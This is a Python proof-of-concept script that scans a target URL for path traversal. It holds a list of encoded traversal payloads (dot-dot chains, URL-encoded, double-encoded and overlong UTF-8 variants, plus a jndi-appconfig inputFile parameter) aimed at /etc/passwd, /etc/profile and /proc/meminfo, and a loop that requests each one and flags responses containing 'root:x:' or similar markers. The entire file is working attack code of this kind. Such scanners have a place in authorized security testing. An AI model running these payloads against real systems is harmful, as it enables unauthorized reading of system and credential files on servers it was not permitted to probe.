import requests

def getpayloads():
    payloads = [{'path': '/etc/passwd', 'tag': 'root:x:', 'content-type': '', 'content-type_no': ''},
    {'path': '/proc/meminfo', 'tag': 'MemTotal', 'content-type': '', 'content-type_no': ''},
    {'path': '/etc/profile', 'tag': '/etc/profile.d/*.sh', 'content-type': '', 'content-type_no': ''},
    {'path': '/file:///etc/passwd', 'tag': 'root:x:', 'content-type': '', 'content-type_no': ''},
    {'path': '/../../../../../../../../../../../../../etc/passwd', 'tag': 'root:x:', 'content-type': '',
     'content-type_no': ''},
    {'path': '/../../../../../../../../../../../../../etc/profile', 'tag': '/etc/profile.d/*.sh',
     'content-type': '', 'content-type_no': ''},
    {'path': '//././././././././././././././././././././././././../../../../../../../../etc/profile',
     'tag': '/etc/profile.d/*.sh', 'content-type': '', 'content-type_no': ''}, {
        'path': '/aa/../../cc/../../bb/../../dd/../../aa/../../cc/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../ee/../../etc/profile',
        'tag': '/bin/bash', 'content-type': '', 'content-type_no': ''}, {
        'path': '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/profile',
        'tag': '/bin/bash', 'content-type': '', 'content-type_no': ''},
    {'path': '/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', 'tag': 'root:x:',
     'content-type': '', 'content-type_no': ''},
    {'path': '/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd',
     'tag': 'root:x:', 'content-type': '', 'content-type_no': ''}, {
        'path': '/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        'tag': 'root:x:', 'content-type': '', 'content-type_no': ''},
    {'path': '/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd', 'tag': 'root:x:',
     'content-type': '', 'content-type_no': ''}]
    return payloads

def poc(url):
    if '://' not in url:
        url = 'http://' + url
    if not url.endswith('/'):
        url = url + "/"
    url = url.rstrip("/")
    payloads = getpayloads()
    result = []
    header = dict()
    header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    for payload in payloads:
        test_url = url + payload["path"]
        try:
            r = requests.get(test_url, headers=header)
        except:
            continue
        if r.status_code != 200:
            continue
        if payload["tag"]:
            if payload["tag"] not in r.text:
                continue
        if payload["content-type"]:
            if payload['content-type'] not in r.headers.get('Content-Type', ''):
                continue
        if payload["content-type_no"]:
            if payload["content-type_no"] in r.headers.get('Content-Type', ''):
                continue
        result.append("[discover traversal]  " + test_url)
    if result:
        return result

